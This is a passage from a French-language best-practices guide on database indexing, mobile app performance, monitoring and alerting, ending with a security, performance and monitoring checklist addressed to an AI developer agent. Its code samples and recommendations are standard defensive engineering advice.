CREATE INDEX idx_orders_cover ON orders (user_id, status) INCLUDE (total, created_at);
```

**Autres optimisations :**
- Eviter `SELECT *` : selectionner uniquement les colonnes necessaires
- Pagination par curseur (pas d'OFFSET pour les grands ensembles)
- Eviter les fonctions sur les colonnes indexees dans le WHERE
- Connection pooling (PgBouncer, HikariCP)
- Caching des requetes frequentes et couteuses (Redis)
- Requetes asynchrones quand possible

---

## 5. PERFORMANCE MOBILE SPECIFIQUE

### 5.1 Temps de demarrage de l'application

**Seuils :** Les utilisateurs abandonnent si le demarrage depasse 2 secondes.

**Strategies de reduction (30-60% de gain possible) :**
- **Deferrer l'initialisation** : charger uniquement le necessaire au lancement
- **Lazy initialization** : initialiser les services quand ils sont utilises
- **Splash screen** : afficher un ecran d'attente pendant le chargement
- **Preloading intelligent** : anticiper les donnees les plus probables
- Deplacer les operations lourdes hors du thread principal
- Reduire les dependances au demarrage
- Utiliser le cache local pour le premier affichage

### 5.2 Gestion de la memoire

**Problemes courants :**
- **Memory leaks** : objets retenus inutilement (listeners, closures, references circulaires)
- **Images non liberees** : bitmaps/images charges sans etre recycler
- **Ecrans en arriere-plan** : activites/fragments non detruits proprement

**Bonnes pratiques :**
- Profiler regulierement (Android Profiler, Xcode Instruments)
- Liberer les ressources dans les callbacks de cycle de vie (onDestroy, dealloc)
- Utiliser des references faibles (WeakReference) pour les caches
- Recycler les vues dans les listes (RecyclerView, UICollectionView)
- Limiter la taille des caches d'images (Glide, SDWebImage)
- Eviter de charger des images en pleine resolution si ce n'est pas necessaire

### 5.3 Optimisation batterie

**Les utilisateurs desinstallent les applications qui drainent la batterie.**

**Regles :**
- **GPS** : utiliser la precision minimale suffisante, arreter le tracking quand inutile
- **Reseau** : regrouper les requetes (batching), eviter le polling frequent
- **Push > Pull** : utiliser les notifications push au lieu de polling
- **Synchronisation intelligente** : adapter la frequence au contexte (Wi-Fi vs cellulaire, charge vs batterie)
- **Work Manager / Background Tasks** : planifier les taches en arriere-plan selon les conditions (reseau, charge)
- Eviter les wakelocks prolonges
- Utiliser les API d'optimisation batterie du systeme (Doze mode Android, Background App Refresh iOS)

### 5.4 Patterns Offline-First

**Principe :** L'application fonctionne d'abord en local, synchronise quand le reseau est disponible.

**Architecture :**
```
[UI] <-> [Cache local (SQLite/Realm/MMKV)] <-> [Sync Engine] <-> [API Backend]
```

**Strategies de synchronisation :**

| Strategie | Description | Cas d'usage |
|-----------|-------------|-------------|
| **Cache-first** | Lire le cache, mettre a jour en arriere-plan | Donnees peu critiques |
| **Network-first** | Tenter le reseau, fallback cache | Donnees recentes importantes |
| **Stale-while-revalidate** | Servir le cache, revalider en arriere-plan | Bon compromis general |
| **Queue de sync** | Stocker les actions, rejouer au retour du reseau | Actions d'ecriture offline |

**Gestion des conflits :**
- Timestamps (last-write-wins)
- Versionnage (CRDTs pour les cas complexes)
- Resolution manuelle par l'utilisateur en dernier recours

### 5.5 Resilience reseau

- **Retry avec backoff exponentiel** : 1s, 2s, 4s, 8s... avec jitter aleatoire
- **Circuit breaker** : arreter les requetes apres N echecs, tester periodiquement
- **Timeout agressifs** : connection 10s, read 30s (adapter au cas)
- **Indicateur de connectivite** : informer l'utilisateur de l'etat du reseau
- **Requetes idempotentes** : permettre les retries sans effets de bord
- **Compression** : Gzip/Brotli pour les payloads API

---

## 6. MONITORING ET OBSERVABILITE

### 6.1 Logging -- Bonnes pratiques

#### Logging structure (JSON)

```json
{
  "timestamp": "2026-03-14T10:30:00.000Z",
  "level": "error",
  "service": "payment-service",
  "trace_id": "abc123def456",
  "user_id": "usr_789",
  "message": "Echec du paiement",
  "error": {
    "type": "PaymentGatewayError",
    "message": "Timeout apres 30s",
    "stack": "..."
  },
  "context": {
    "amount": 49.99,
    "currency": "EUR",
    "gateway": "stripe"
  }
}
```

#### Niveaux de log

| Niveau | Usage | Exemple |
|--------|-------|---------|
| **FATAL** | Application ne peut plus fonctionner | Base de donnees inaccessible |
| **ERROR** | Erreur qui necessite une intervention | Echec de paiement |
| **WARN** | Situation anormale mais geree | Retry reussi apres echec |
| **INFO** | Evenement metier important | Utilisateur connecte, commande creee |
| **DEBUG** | Detail technique pour le diagnostic | Requete SQL executee, payload recu |
| **TRACE** | Detail tres granulaire | Entree/sortie de fonction |

**Regles :**
- Production : INFO et au-dessus (DEBUG/TRACE desactives)
- Staging : DEBUG
- JAMAIS de donnees sensibles dans les logs (mots de passe, tokens, PII)
- Correlation ID / Trace ID sur chaque requete pour le tracage distribue
- Format structure (JSON) pour le parsing automatise
- Rotation et retention definies (ex : 30 jours en production)

#### Outils de centralisation

| Outil | Type | Forces |
|-------|------|--------|
| **ELK Stack** (Elasticsearch, Logstash, Kibana) | Self-hosted | Puissant, flexible |
| **Grafana Loki** | Self-hosted / Cloud | Leger, indexe les labels pas le contenu |
| **Datadog Logs** | SaaS | Integration complete avec APM |
| **AWS CloudWatch** | Cloud AWS | Integration native AWS |

---

### 6.2 Suivi des erreurs (Error Tracking)

#### Sentry

**Capacites :** Suivi d'erreurs en temps reel, performance monitoring, logs structures (beta 2025), support web + mobile + backend.

**Bonnes pratiques d'integration :**
```javascript
// Sentry avec contexte enrichi
import * as Sentry from '@sentry/browser';

Sentry.init({
  dsn: 'https://...@sentry.io/...',
  environment: process.env.NODE_ENV,
  release: process.env.APP_VERSION,
  tracesSampleRate: 0.1,       // 10% des transactions en production
  replaysSessionSampleRate: 0.1,
  replaysOnErrorSampleRate: 1.0, // 100% des sessions avec erreur
});

// Ajouter du contexte utilisateur
Sentry.setUser({ id: userId, email: userEmail });

// Breadcrumbs pour le contexte
Sentry.addBreadcrumb({
  category: 'payment',
  message: 'Tentative de paiement',
  data: { amount: 49.99, currency: 'EUR' },
  level: 'info',
});
```

#### Firebase Crashlytics

**Cas d'usage :** Applications mobiles iOS et Android.
- Detection de crash 95%+ avec overhead minimal
- Regroupement automatique des crashs similaires
- Integration avec Firebase Analytics pour le contexte

**Performance :** Les SDKs modernes de Sentry et Crashlytics ont un impact minimal sur les performances grace a l'architecture optimisee, l'echantillonnage intelligent et le traitement en edge.

---

### 6.3 APM (Application Performance Monitoring)

**Principe :** Mesurer et analyser les performances de l'application en temps reel : temps de reponse, debit, taux d'erreur, traces distribuees.

**Metriques cles :**

| Methode | Metriques | Cas d'usage |
|---------|-----------|-------------|
| **RED** | Rate, Errors, Duration | Microservices (requetes entrantes) |
| **USE** | Utilization, Saturation, Errors | Ressources infra (CPU, memoire, disque) |
| **4 Golden Signals** | Latence, Trafic, Erreurs, Saturation | Google SRE |

**Outils APM :**

| Outil | Type | Forces |
|-------|------|--------|
| **Datadog APM** | SaaS | Complet, traces distribuees, integrations |
| **New Relic** | SaaS | APM historique, tres mature |
| **Grafana Tempo + Prometheus** | Open source | Flexible, cout maitrise |
| **Elastic APM** | Self-hosted / Cloud | Integration ELK, open source |
| **AWS X-Ray** | Cloud AWS | Traces distribuees AWS natives |

---

### 6.4 Health Checks

**Types :**

| Type | Verifie | Endpoint typique |
|------|---------|-----------------|
| **Liveness** | L'application tourne-t-elle ? | `/health/live` |
| **Readiness** | L'application peut-elle servir du trafic ? | `/health/ready` |
| **Startup** | L'application a-t-elle fini de demarrer ? | `/health/startup` |

```python
# Health check complet (FastAPI)
from fastapi import FastAPI, status
from fastapi.responses import JSONResponse

app = FastAPI()

@app.get("/health/live")
async def liveness():
    return {"status": "alive"}

@app.get("/health/ready")
async def readiness():
    checks = {
        "database": await check_db(),
        "redis": await check_redis(),
        "external_api": await check_external_api(),
    }
    all_healthy = all(checks.values())
    return JSONResponse(
        status_code=status.HTTP_200_OK if all_healthy else status.HTTP_503_SERVICE_UNAVAILABLE,
        content={"status": "ready" if all_healthy else "not_ready", "checks": checks}
    )
```

**Bonnes pratiques :**
- Liveness : simple et rapide (pas de dependance externe)
- Readiness : verifier les dependances critiques (BDD, cache, APIs)
- Timeout sur chaque verification de dependance
- Ne pas exposer d'informations sensibles dans les reponses
- Kubernetes utilise ces endpoints pour le scheduling et le load balancing

---

### 6.5 Strategies d'alerting

**Principes :**

| Principe | Description |
|----------|-------------|
| **SLO-based** | Alerter sur les objectifs de niveau de service, pas sur des seuils arbitraires |
| **Actionnable** | Chaque alerte doit avoir une action claire a entreprendre |
| **Pas de fatigue** | Reduire le bruit : regrouper, dedupliquer, prioriser |
| **Multi-canal** | Slack, PagerDuty, email selon la severite |
| **Escalade** | Si pas de reponse en X minutes, escalader au niveau superieur |

**Classification des alertes :**

| Severite | Temps de reponse | Canal | Exemple |
|----------|-----------------|-------|---------|
| **P1 - Critique** | < 15 min | PagerDuty + appel | Service down, perte de donnees |
| **P2 - Haute** | < 1 heure | Slack urgent | Degradation performance, erreurs 5xx elevees |
| **P3 - Moyenne** | < 4 heures | Slack standard | Erreurs intermittentes, disque > 80% |
| **P4 - Basse** | Prochain jour ouvre | Email / ticket | Certificat expire dans 30j, deprecation |

**Anti-patterns a eviter :**
- Alertes sur des metriques sans signification business
- Seuils trop sensibles (alerte pour 1 erreur 500)
- Pas de runbook associe a l'alerte
- Alertes ignorees systematiquement (alert fatigue)
- Pas de post-mortem apres les incidents

---

## RESUME -- CHECKLIST RAPIDE POUR L'AGENT IA DEVELOPPEUR

### Securite
- [ ] Input validation cote serveur (allowlist)
- [ ] Output encoding selon le contexte
- [ ] Requetes parametrees (jamais de concatenation SQL)
- [ ] Authentification robuste (MFA, JWT court, OAuth2+PKCE)
- [ ] Autorisation sur chaque endpoint (RBAC/ABAC)
- [ ] Mots de passe haches avec Argon2id
- [ ] HTTPS partout + HSTS
- [ ] CORS restrictif (allowlist d'origines)
- [ ] Rate limiting (global + endpoints sensibles)
- [ ] Headers de securite (CSP, X-Frame-Options, etc.)
- [ ] Secrets dans un vault, jamais dans le code
- [ ] Dependances a jour, scannees regulierement
- [ ] Logging des evenements de securite
- [ ] RGPD : minimisation, consentement, droit a l'effacement

### Performance
- [ ] Core Web Vitals : LCP < 2.5s, INP < 200ms, CLS < 0.1
- [ ] Images optimisees (AVIF/WebP, responsive, lazy load)
- [ ] Code splitting + tree shaking
- [ ] Cache multi-niveaux (navigateur, CDN, serveur)
- [ ] Bundle JS < 170 KB compresse (chargement initial)
- [ ] Pas de probleme N+1 en base de donnees
- [ ] Index pertinents sur les requetes frequentes
- [ ] Mobile : demarrage < 2s, gestion memoire, batterie
- [ ] Offline-first quand pertinent

### Monitoring
- [ ] Logs structures (JSON) avec correlation ID
- [ ] Error tracking (Sentry / Crashlytics)
- [ ] APM avec metriques RED/USE
- [ ] Health checks (liveness + readiness)
- [ ] Alertes SLO-based, actionnables, multi-niveaux

---

> Sources de reference : OWASP Top 10 2021, OWASP Cheat Sheet Series, NIST 800-63b, IETF OAuth 2.0 BCP (2025), Google Web Vitals, RGPD (UE 2016/679).
